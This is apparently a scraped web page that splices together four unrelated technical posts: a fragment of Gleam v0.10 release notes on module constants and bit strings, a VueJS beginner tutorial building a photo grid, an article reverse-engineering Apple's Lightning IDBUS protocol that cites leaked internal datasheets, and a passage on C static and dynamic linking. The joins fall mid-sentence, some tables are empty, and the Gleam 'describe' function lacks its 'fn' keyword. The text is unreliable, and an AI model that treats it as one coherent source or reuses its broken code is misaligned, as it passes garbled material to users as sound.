<div><div><pre><code><span>pub</span> <span>describe</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
  <span>case</span> <span>year</span> <span>{</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&lt;</span> <span>start_year</span><span>()</span> <span>-&gt;</span> <span>"Before"</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&gt;</span> <span>end_year</span><span>()</span> <span>-&gt;</span> <span>"After"</span>
    <span>_</span> <span>-&gt;</span> <span>"During"</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>To solve all these problems Gleam now has module constants. They are always
inlined by the compiler, and can be used in case clause guards.</p>

<p>Using them the above code can be rewritten like so:</p>

<div><div><pre><code><span>pub</span> <span>const</span> <span>start_year</span><span>:</span> <span>Int</span> <span>=</span> <span>2101</span>
<span>pub</span> <span>const</span> <span>end_year</span><span>:</span> <span>Int</span> <span>=</span> <span>2111</span>

<span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>start_year</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>start_year</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>end_year</span>
<span>}</span>

<span>pub</span> <span>describe</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
  <span>case</span> <span>year</span> <span>{</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&lt;</span> <span>start_year</span> <span>-&gt;</span> <span>"Before"</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&gt;</span> <span>end_year</span> <span>-&gt;</span> <span>"After"</span>
    <span>_</span> <span>-&gt;</span> <span>"During"</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Much better! Module constants are going to provide the basis of some exciting
new features in future, so watch this space. 🚀</p>

<p>Thanks to <a href="https://github.com/thehabbos007">Ahmad Sattar</a> for taking the
lead in the implementation of this feature.</p>

<h2 id="bit-string-syntax">Bit string syntax</h2>

<p>One of great things about Erlang is how easy it is to work with raw bits and
bytes using the bit string literal syntax. Starting with this release Gleam
supports this too!</p>

<p>Explaining all the things one can do with the bit string syntax would take
longer than I have now, but in short they give a declarative way of
constructing and parsing raw data of any format. What’s more the Erlang VM is
highly optimised for this, so bit syntax is highly efficient too!</p>

<p>For example, if I wanted to create a 4 byte unsigned little endian integer
with the value of 100 I could do so using bit syntax like this:</p>

<div><div><pre><code><span>let</span> <span>my_integer</span> <span>=</span> <span>&lt;&lt;</span><span>100</span><span>:</span><span>unsigned</span><span>-</span><span>little</span><span>-</span><span>int</span><span>-</span><span>size</span><span>(</span><span>4</span><span>)</span><span>&gt;&gt;</span>
</code></pre></div></div>

<p>Or if I wanted to extract the title, artist, album, year, and comment from an
MP3 music file’s ID3 tags I could pattern match on it like this:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>get_metadata</span><span>(</span><span>id3</span><span>:</span> <span>BitString</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>(</span><span>Metadata</span><span>,</span> <span>String</span><span>)</span> <span>{</span>
  <span>case</span> <span>id3</span> <span>{</span>
    <span>&lt;&lt;</span>
      <span>"TAG"</span><span>:</span><span>utf8</span><span>,</span>
      <span>title</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>artist</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>album</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>year</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>4</span><span>),</span>
      <span>comment</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>_</span><span>rest</span><span>:</span><span>binary</span><span>,</span>
    <span>&gt;&gt;</span> <span>-&gt;</span> <span>Ok</span><span>(</span><span>Metadata</span><span>(</span><span>title</span><span>,</span> <span>artist</span><span>,</span> <span>album</span><span>,</span> <span>year</span><span>,</span> <span>comment</span><span>))</span>

    <span>_</span> <span>-&gt;</span> <span>Error</span><span>(</span><span>"Not a valid ID3 tag"</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Thanks to <a href="https://benjamintan.io/blog/2014/06/10/elixir-bit-syntax-and-id3/">Benjamin Tan’s blog post</a>
for this example.</p>

<p>For another example of bit syntax in action check out this <a href="https://github.com/lpil/ecoji/"><em>very serious</em>
base64 encoding alternative</a> which converts arbitrary data into emojis!</p>

<p>As part of this new feature we have introduced <code>BitString</code> and <code>UtfCodepoint</code>
types into the prelude, and split the standard library <code>Iodata</code> type into
<a href="https://hexdocs.pm/gleam_stdlib/gleam/string_builder/"><code>StringBuilder</code></a> and <a href="https://hexdocs.pm/gleam_stdlib/gleam/bit_builder/"><code>BitBuilder</code></a> types, which
are for efficiently constructing strings and bit strings respectively.</p>

<p>Thanks to <a href="https://github.com/tomwhatmore">Tom Whatmore</a> for taking the
lead in the implementation of this feature.</p>

<h2 id="the-rest">The rest</h2>

<p>There are many more new additions, improvements, and bug fixes to the compiler and
the standard library, including but not limited to support for regex expressions
(implemented by <a href="https://github.com/eterps/">Erik Terpstra</a>) and environment
variables (implemented by <a href="https://github.com/crowdhailer/">Peter Saxton</a>).</p>

<p>For information on the rest in this release please check out the <a href="https://github.com/gleam-lang/gleam/blob/main/CHANGELOG.md#v0100---2020-07-01">Gleam
changelog</a> and the <a href="https://github.com/gleam-lang/stdlib/blob/main/CHANGELOG.md#v0101---2020-07-01">standard library

virtual machine a production-ready reality please consider <strong><a href="https://github.com/sponsors/lpil">sponsoring

<p>I’ve been playing with VueJS recently. I’m impressed. It’s simple, powerful, super fun and incredibly popular. Even a moron like me can do interesting things with it rapidly. It just goes to show that anybody can do great things with it. Do you have five minutes in front of you ?</p>



<h3>Once upon a time</h3>



<p>2012 in the New York area. <strong>At that time <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://twitter.com/youyuxi" target="_blank" rel="noreferrer noopener">Evan You</a> is living his best life learning Javascript.</strong> He’s doing side projects left and right for laughs. One of them explodes in <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://news.ycombinator.com/item?id=3618387" target="_blank" rel="noreferrer noopener">popularity on Hackernews</a> ! Evan didn’t know, but he just got Google’s attention.</p>



<figure><img src="https://i.imgur.com/8wEZsjZ.png" data-src="https://i.imgur.com/8wEZsjZ.png" alt="vuejs"></figure>



<p>Very quickly hired at Google, his role is to create “experimental projects” for innovative ideas. He uses a lot of vanilla Javascript. He tries AngularJS and other frameworks, but he rages instantly on it. He doesn’t find the freedom he needs. So he had an idea : <strong>extract the best part of these frameworks and make his own light and malleable framework for his own personal need</strong>.</p>



<p>In July 2013, the first commit of VueJS was made. For the record, VueJS was to be called Seed.JS. But it was taken on NPM! Since its framework is centered around the view part, Evan wanted something that looked like “View” in English. He went to google translate and translated “View” into several languages. <strong>He came across the French translation “Vue” and <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://www.youtube.com/watch?v=OrxmtDw4pVI&amp;feature=youtu.be&amp;t=374" target="_blank" rel="noreferrer noopener">found it cool</a>.</strong> A few minutes later, VueJS was published.</p>



<p>In 2014, the first version of VueJS arrived on the Internet. The project doesn’t explode right away. But like <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://twitter.com/taylorotwell/status/590585596780879872" target="_blank" rel="noreferrer noopener">the creator of Laravel</a>, more and more people are talking about it. Today, <a href="https://npm-stat.com/charts.html?package=react&amp;package=vue&amp;package=angular&amp;from=2014-05-20&amp;to=2020-05-20" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">VueJS is in the big league</a>.</p>



<h3>What is VueJS ?</h3>



<p><strong>VueJS is a Javascript frontend framework to create user interfaces.</strong> You’re going to say “one more?” and the answer is yes. Except it’s a little different.</p>



<p><strong>First, it’s interesting to understand that VueJS was designed to be incrementally integrated</strong>. That means if you have an existing frontend application, you don’t have to redo everything. You can make a new part in VueJS and quickly integrate it with the rest.</p>



<p>VueJS is also the most is easy to pick up of all the frontend framework. <strong>That’s what attracted me as a backend developer in the first place. </strong>Very quickly, I did some frontend stuff that worked ! I was shocked! Within a few hours of reading the doc and testing stuff, I had understood all the basics. I was already shipping frontend.</p>



<figure><img src="https://i.imgur.com/UTgj9wh.png" data-src="https://i.imgur.com/UTgj9wh.png" alt="ship"></figure>



<p>VueJS also takes good ideas from its competitors. It allows data binding.<strong> The data and the DOM are coupled and reactive to changes.</strong> We also find <a href="https://bitsofco.de/understanding-the-virtual-dom/" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">the concept of virtual dom</a> with VueJS. The DOM is not directly changed, it goes through the virtual DOM.</p>



<p>We also find <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://vuejs.org/v2/guide/components.html" target="_blank" rel="noreferrer noopener">the organization by component</a>. <strong>This feature allows you to divide your application into several sub-components that each manage their own life and are reusable.</strong> Let’s imagine you want to make a list of images: you can make a component that manages an image and a component that manages a list of image components.</p>



<p>That’s all well and good, but how does it work?</p>



<h3>How does it work?</h3>



<p>For once I cheat a bit and show some code in advance to better understand what’s coming next. Hello World!</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;script src="https://cdn.jsdelivr.net/npm/vue"&gt;&lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div id="app"&gt;{{ message }}&lt;/div&gt;
    &lt;script&gt;
      const data = { message: "Hello World !" };
      new Vue({
        el: "#app",
        data: data
      });
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>



<p>VueJS focuses on the view part of your application.<strong> To do so, the framework is partly inspired by <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel" target="_blank" rel="noreferrer noopener">the MVVM architecture pattern</a>.</strong> VueJS will link your DOM, the view part, with your view instance, the Model-View part. These two parts are linked by the data-binding system.</p>



<p>Finally, the data in your view instance is the Model part. <strong>It will provide your application with data.</strong> The Hello World code schematized looks like this.</p>



<div><figure><img src="https://i.imgur.com/p3IKY9G.jpg" data-src="https://i.imgur.com/p3IKY9G.jpg" alt="vuejs"></figure></div>



<p>A VueJS application is composed of one or more components. When the instance of the global application is launched, there is first a root instance. <strong>This is root instance is composed of a tree of components which have their own root instance.</strong></p>



<p>But what happens to the life cycle of your instance when you create the component with new Vue()? I wanted to make my usual silly schema but it turns out that t<strong>he official VueJS doc is just EXCELLENT</strong>. <a href="https://www.jesuisundev.com/en/please-write-your-technical-documentation/" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">It’s rare to have a good documentation</a>. So I’m just going to pump their schema.</p>



<div><figure><img src="https://vuejs.org/images/lifecycle.png" data-src="https://vuejs.org/images/lifecycle.png" alt="vuejs"></figure></div>



<p>I’ll let you admire it and figure out what’s going on. The only thing that might be unclear is the difference between “created” and “mounted”.</p>



<ul><li><strong>Created </strong>means that the element is only available in the View-Model part.</li><li><strong>Mounted </strong>in VueJS means that the DOM element has been rendered in your page and you can manipulate it.<br></li></ul>



<p>OK great, now let’s get our hands dirty.</p>



<h3>Show me the code</h3>



<p>I’m gonna show you a piece of code I made for a personal need. <strong>A simple responsive gallery with only three components.</strong> We start with the root app.</p>



<p><strong>app.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div id="app"&gt;
    &lt;action v-bind:message="messageAction"&gt;&lt;/action&gt;
    &lt;grid v-bind:photos="photos"&gt;&lt;/grid&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  import action from './components/action.vue'
  import grid from './components/grid.vue'

  export default {
    name: 'App',
    components: { action, grid },
    data: function () {
      return {
        photos: [
          {
            id: 0,
            url: "https://i.imgur.com/p3IKY9G.jpg"
          }
        ],
        messageAction: "It's working !"
      }
    }
  }
&lt;/script&gt;

&lt;style&gt;
  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: Arial;
  }
&lt;/style&gt;</pre>



<p>On the <strong>template side</strong> I start by declaring my root app in a div. Inside there are two other components (action and grid). <strong>Note how I pass the data that comes from the instance seen in the components with the v-bind directives.</strong></p>



<p>On the <strong>script side</strong>, I import the components to use them in the app we export. We declare the data, the pictures and a message, which is reactive to changes.</p>



<p>On the <strong>style side</strong> I integrate very simple CSS that is global to the whole project.</p>



<p>Next up, the action component.</p>



<p><strong>action.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div class="callToAction"&gt;
    &lt;h1&gt;{{ message }}&lt;/h1&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    name: 'callToAction',
    props: {
      message: String
    }
  }
&lt;/script&gt;

&lt;style scoped&gt;
  .callToAction {
    position: absolute;
    height: 100%;
    width: 100%;
    padding: 0;
    margin: 0;
    display: -webkit-box;
    display: -moz-box;
    display: -ms-flexbox;
    display: -webkit-flex;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  h1 {
    color: red;
    background:black;
    padding: 10px;
  }
&lt;/style&gt;
</pre>



<p>The action component is simply a text that we put in the middle of the page and that will be a call to action for the user.<strong> I use the {{ message }} syntax to display the message that comes from the app.</strong></p>



<p>Note also that the style part is “scoped”. <strong>This means that the CSS in question has effect only in this component.</strong> This is very useful to separate the style scope of each component.</p>



<p><strong>grid.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;div class="grid"&gt;
    &lt;div v-bind:key="grid.id" v-for="grid in grids" class="column"&gt;
      &lt;photo
        v-for="photo in grid" 
        v-bind:photo="photo" 
        v-bind:key="photo.id"
      &gt;&lt;/photo&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import photo from './photo.vue'

export default {
  name: 'grid',
  components: { photo },
  props: ['photos'],
  computed: {
    grids: function () {
      const grids = []
      const deepClonePhotos = JSON.parse(JSON.stringify(this.photos))
      const gridsToMake = Math.ceil(deepClonePhotos.length / 2) - 1
      
      for (let index = 0; index &lt;= gridsToMake; index++) {
        const currentGrid = []

        for(let i = 0; i &lt; 2; i++) {
          if(deepClonePhotos.length) {
            currentGrid.push(deepClonePhotos.shift())
          }
        }
        
        grids.push(currentGrid)
      }

      return grids
    }
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
  .grid {
    display: -ms-flexbox; /* IE10 */
    display: flex;
    -ms-flex-wrap: wrap; /* IE10 */
    flex-wrap: wrap;
    padding: 0;
  }

  /* Create four equal columns that sits next to each other */
  .column {
    -ms-flex: 25%; /* IE10 */
    flex: 25%;
    max-width: 25%;
    padding: 0;
  }

  /* Responsive layout - makes a two column-layout instead of four columns */
  @media screen and (max-width: 800px) {
    .column {
      -ms-flex: 50%;
      flex: 50%;
      max-width: 50%;
    }
  }

  /* Responsive layout - makes the two columns stack on top of each other instead of next to each other */
  @media screen and (max-width: 600px) {
    .column {
      -ms-flex: 100%;
      flex: 100%;
      max-width: 100%;
    }
  }
&lt;/style&gt;
</pre>



<p>The grid component is the one that will make the logic to display image grids in relation to the data it receives from the app. In the template part I create a column every two images. In these columns I display my two images. I do this using another photo component. <strong>You will notice the use of the v-for directive to browse my lists.</strong></p>



<p>In the script part, <strong>I use <a aria-label="undefined (s’ouvre dans un nouvel onglet)" href="https://vuejs.org/v2/guide/components-props.html" target="_blank" rel="noreferrer noopener">props</a> to get the data passed by the v-bind in the app</strong>. Then I use the computed function to create a new grids variable with the data of the pictures.</p>



<p><strong>photo.vue</strong></p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;template&gt;
  &lt;img :src="photo.url" alt ="" /&gt;
&lt;/template&gt;

&lt;script&gt;
  export default {
    name: 'photo',
    props: ['photo']
  }
&lt;/script&gt;

&lt;style scoped&gt;
  .column img {
    vertical-align: middle;
    width: 100%;
  }
&lt;/style&gt;
</pre>



<p>The photo component just allows me to isolate the display of the photo in a corner. It’s quite simple, but it allows me to change a lot of things on this side in the future without having to touch the logic above! <strong>As usual, I put a little <a href="https://codesandbox.io/s/vuejs-en-5-minutes-fz4h4" target="_blank" aria-label="undefined (s’ouvre dans un nouvel onglet)" rel="noreferrer noopener">codesandbox</a>, you can play with it and see it all in action.</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                
                <p>Created on 1.7.20</p>

                <p>
                    Here's my little article about (almost) everything I know about Apple Lightning and related technologies: <b>Tristar</b>, <b>Hydra</b>, <b>HiFive</b>, <b>SDQ</b>, <b>IDBUS</b> and etc. But first a tiny warning...
                </p>

                <p><i>
                        Read this article on your own <b>risk</b>! The information in this artcile is based on a lot of AppleInternal materials (leaked datasheets, schematics, source codes) I read in a diagonal direction. And of course on my own research too. I have to warn you, the reader, that I have never done such a research before. Thus, this write-up might use incorrect or just weird terms and turn out partially or completely <b>wrong</b>! 
                    </i>
                </p>

                <p>
                    Before going <i>deeper</i>, let's briefly sort out the terms:
                </p>

                <div>
                    <h2>What's Lightning?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_port_pinout.jpg"><br>

                    <b>Lightning</b> - is a digital interface used in most of the Apple's iOS devices since late 2012. Replaced the old 30-pin connector</p><p>

                    

                    You can see the female port pinout on the picture above and the connector pinout on the picture below:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/lightning_connector_pinout.jpg"><br>

                    Please pay attention to the fact that in the connector, pins on both sides of connector aren't wired in exact same order. Thus, a host device have to detect orientation of a cable before doing anything else</p><p>
                    
                    

                    Though it's not always applicable. Many Lightning accessories I've played with have mirrored pinouts in their connectors
                </p></div>

                <div>
                    <h2>What're Tristar and Hydra?</h2>

                    <b>Tristar</b> - is the integrated circuit embedded in every device shipped with Lightning female port. Basically, it's a MUX:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/tristar_schematic.png">

                    Among many other things, its main purpose is to communicate with Lightning male connector once one was connected - detect orientation and detect <b>Accessory ID</b> and route internal interfaces like USB, UART and SWD accordingly</p><p>

                    

                    <b>Hydra</b> - is the new variant of Tristar used since iPhone 8/X. The most significant change appears to be a support of wireless charging, but that's to be verified:<br>
                    
                    <img src="https://nyansatan.github.io/lightning/resources/hydra_schematic.png"><br>

                    There're 5 major Tristar/Hydra variants known to me:</p><ul>
                        <li><b>TI THS7383</b> - first-gen Tristar used in iPad mini 1 and iPad 4</li>
                        <li><b>NXP CBTL1608A1</b> - first-gen Tristar used in iPhone 5 and iPod touch 5</li>
                        <li><b>NXP CBTL1609A1</b> - mysterious first-gen Tristar used in iPod nano 7 - <a target="_blank" href="https://www.ifixit.com/Teardown/iPod+Nano+7th+Generation+Teardown/10826#s38931">source</a></li>
                        <li><b>NXP CBTL1610Ax</b> - second-gen Tristar used since iPhone 5C/5S and apparently everything else that doesn't support wireless charging. There're multiple generations of this one (<b>x</b> - number of generation)</li>
                        <li><b>NXP CBTL1612Ax</b> - Hydra used since iPhone 8/X and apparently everything else that supports wireless charging (<b>x</b> - number of generation)</li>
                    </ul><p>

                    From now on, I'll only use the term <b>Tristar</b>, but keep in mind that it will also mean <b>Hydra</b> as well, as they are very similar in the most of aspects that are gonna be covered in this text
                </p></div>

                <div>
                    <h2>What's HiFive?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_connector.svg"><br>

                    <b>HiFive</b> - is Lightning slave, i.e. a male connector. It contains a logical element as well - that chip is known as <b>SN2025</b>/<b>BQ2025</b>
                </p></div>

                <div>
                    <h2>What're SDQ and IDBUS?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/idbus_little.png"><br>

                    These 2 terms are often referred as kind of synonyms. For convinience, I'll only use term <b>IDBUS</b> from now on, as it seems more correct to me (and that's how this technology called in the THS7383 datasheet)</p><p>

                    

                    So, <b>IDBUS</b> - is a digital protocol used for negotiations between Tristar and HiFive. Very similar to <a target="_blank" href="https://en.wikipedia.org/wiki/1-Wire">Onewire protocol</a></p></div>

                <div>
                    <h2>Now we can play</h2><p>

                    Let's sniff the negotiations between Tristar and HiFive. Take a logic analyzer, a Lightning male-to-female passthrough breakout board, some accessory (normal Lightning to USB cable would fit just fine) and of course some device with Lightning port</p><p>

                    

                    First connect logic analyzer's channels to both <b>ID</b> lines of the breakout (pins 4 and 8) and connect the breakout to the device, but do not connect the accessory just yet:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_1.jpg"><br>

                    Right after that start sampling (any rate from 2 MHz and up should be fine). You'll see something like this:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/id_lines_activity.png"><br>

                    As you can see, Tristar polls each ID line by rotation - one after another. But since we didn't connect any accessory, the polling obviously fails. At some point the device will grow tired of this endless stream of failures and stop it. Meanwhile let's examine what exactly happens while polling:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/polling_explained_1.png"><br>

                    First, we can see a long interval (~1.1 milliseconds) when the level is just high and nothing else is happening:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/charge.png"><br>

                    Apparently that time is used to charge internal HiFive's capacitor - the energy from it will be then used to power-up its internal logic chips</p><p>

                    

                    What happens next is far more interesting:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful.png"><br>

                    Obviously, that's some data flowing. But how to interpret it? How to decode it? Let's virtually split it to almost the least least significant parts - to something that I call <b>words</b>:

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful_splitted.png"><br>

                    So basically a <b>word</b> is a combination of <b>fall</b>-<b>rise</b>-<b>fall</b>:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/word_splitted.png"></p><ul>
                        <li><span>Meaningful Stage</span> - time interval taken by this stage defines meaning of a word</li>
                        <li><span>Recovery Stage</span> - time interval which is apparently required for processing the <span>Meaningful Stage</span> on recieving side and/or preparing the next word on sending stage</li>
                    </ul><p>

                    Here is a table of known word types with their time intervals for both stages we discussed above (all units are in microseconds):</p><table>

                    </tbody></table>

                    <p>

                    * - <b>STOP</b> is used when it's a last bit in a byte</p><p>

                    

                    Using the above table we can now build a simple decoder of the protocol:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/decoded.png"><br>

                    As you can see, the first word a host sends is <b>BREAK</b> - when Tristar wants to send a new request, it always starts with it. Then comes a data stage. Please pay attention to the fact that last (8th) bit of a byte has longer <span>Recovery Stage</span>. When a data stage is over, a host sends another <b>BREAK</b>. Then a slave must send a reply (after at least a 2.5 us delay - see the table). Tristar will wait for around 2.2 ms for a reply. If it's not issued in this time interval, Tristar will try to poll another ID line</p><p>

                    

                    Now let's examine the data stage on the example above - <span>0x74 0x00 0x02 0x1f</span>:

                    </p><ul>
                        <li><span>0x74</span> - request/response type. Always even for request, always odd for response (request type + 1)</li>
                        <li><span>0x00 0x02</span> - actual data. Can be empty</li>
                        <li><span>0x1f</span> - CRC8 of both the request type byte and the whole data (polynomial - 0x31, initial value - 0xff)</li>
                    </ul><p>

                    Let's connect some accessory to our setup and see what happens. I'll use Apple's original Lightning to USB cable:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_2.jpg"><br>

                    And here is what appears on IDBUS after a 0x74 request:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x75.png"><br>

                    HiFive replied! And if you scroll further you'll see a lot of other request/response pairs:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x79.png"><br>

                    Some requests do not need a response though:

                    <img src="https://nyansatan.github.io/lightning/resources/request_0x84.png"><br>
                </p></div>

                <div>
                    <h2>Interpreting IDBUS requests and responses</h2><p>

                    The most important IDBUS request is <b>0x74</b> - it is used for two purposes: to tell HiFive enable full current (in case that's supported by an accessory) and to ask it about pin configuration the cable supports and some other metadata</p><p>

                    

                    Not too much is known about how response 0x75's data is encoded. But some bits were available in a certain old Tristar datasheet:</p><table>

<p>Static vs dynamic linking usually has to do with our tolerance for the size of our final executable. A<em> static </em>executable contains all code necessary to run the executable, so the operating system loads the executable into memory, and it’s off to the races. However, if we keep duplicating code over and over again, such as printf, then it starts to use up more and more space. So, a <em>dynamic</em> executable means that we only store <em>stubs</em> in the executable. Whenever we want to access printf, it goes out to a <em>dynamic linker</em> and loads the code essentially <em>on demand</em>. So, we sacrifice a tiny bit of speed for a much smaller executable.</p>

<h2 id="linking">What is Linking?</h2>



<p>When I hear someone talk about <em>compiling</em> their program into an executable, they are really eliding over several stages. The definition of  compiling is to <em>produce something by combining information collected from different sources.</em> In computing, we generally think of compiling as turning a higher-level language, such as C, into a lower-level code, such as assembly.</p>



<p>The final stage before we get an executable is the <em>linking</em> stage. This is where we <em>link</em> (hence the name) all sources together to produce one coherent executable. This is also where all outstanding symbols need to be resolved. Symbol is just fancy for the name of a function or global variable.</p>



<p>We can take a look at <em>object code, </em>which is what we get after we assemble but before we link. Here’s an object dump of an example program.</p>



<pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void some_func(int a, int b);

int main(int argc, char *argv[]) {
	if (argc &lt; 3) {
		printf("Not enough arguments.\n");
		return -1;
	}

	int a = atoi(argv[1]);
	int b = atoi(argv[2]);

	some_func(a, b);

	return 0;
}</pre>



<p>This code produces the following object code, which I disassemble using objdump for RISC-V.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png" alt="" width="500" height="341" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png 667w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23-300x204.png 300w" sizes="(max-width: 500px) 100vw, 500px"></figure></div>



<p>Notice that the function some_func has been prototyped, but has not been defined. This will be the responsibility of the linker to find the symbol some_func and add it into our program. Notice what happens when I try to link this program without ever defining some_func.</p>



<pre>/opt/riscv_1/lib/gcc/riscv64-unknown-linux-gnu/9.2.0/../../../../riscv64-unknown-linux-gnu/bin/ld: /tmp/ccmgFc75.o:
<br>
in function .L2': test.c:(.text+0x62): undefined reference to some_func'
<br>
collect2: error: ld returned 1 exit status</pre>



<p>The linker is looking for the symbol some_func, but it cannot find it, so we get an <em>undefined reference</em>. We know this is at the linker stage because the error is “ld returned 1 exit status”. The “ld” means “linker”.</p>



<p>We also can see that the address of the function main is 0, this is because we haven’t linked a program. So, our object code just contains <em>bubbles</em> of code, which will then be placed into our executable at certain locations by the linker.</p>



<hr>



<h2 id="finding">Finding Symbols</h2>



<p>If we use the command <em>nm</em>, which is used to list symbols in an object file, we can see all of the <em>unresolved</em> symbols. Our object code is looking for these, but it doesn’t need to know where they are until we have a full executable program.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png" alt="" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png 317w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24-300x169.png 300w" sizes="(max-width: 317px) 100vw, 317px"></figure></div>



<p>You can see that in this object file, the linker has a little bit of work to do. It must find atoi, puts, and some_func, which are flagged as U for undefined symbols. When we execute the linker, we will specify certain libraries, such as -lc (the C library), which most of these symbols will be found. Our some_func has never been defined, so our linker cannot really succeed until we define it somewhere.</p>



<hr>



<h2 id="static">Static Libraries (archives)</h2>



<p>Archive files generally end in .a and contain code and other information that will be added to the final executable. Essentially, archive files are just a collection of object files into one file. Therefore, when we link to an archive file, we extract the actual code from the object code into our executable. The nice thing about archive files is that we don’t need to add ALL symbols into our executable–we only need those symbols that need to be used.</p>



<p>Usually, we have archive versions of all libraries to allow for <em>static</em> executables. These executables are those that don’t need any additional loading to run. In other words, these are self-contained files. The linker stage will pull in the code directly from the .a file into the executable, and all is done. The more code that the linker pulls in, the larger the executable will be.</p>



<p>Let’s go ahead and define some_func and see how linking works.</p>



<pre data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;

void some_func(int a, int b)
{
	printf("Data = %d\n", a * b);
}
</pre>



<p>It’s very simple, but the point is to have some code that the linker can pull in. Recall that the linker gave us an “undefined reference” error because we didn’t define some_func. Now, we have it defined, so let’s see what happens.</p>



<pre>riscv64-unknown-linux-gnu-gcc -static -o test test2.o test.o</pre>



<p>Notice that I’m using gcc still. This will automatically invoke the linker and pull in the necessary <em>start files</em>. If we invoke the linker directly, we have to define _start and tell the program how to start, or we would have to directly specify the start files.</p>



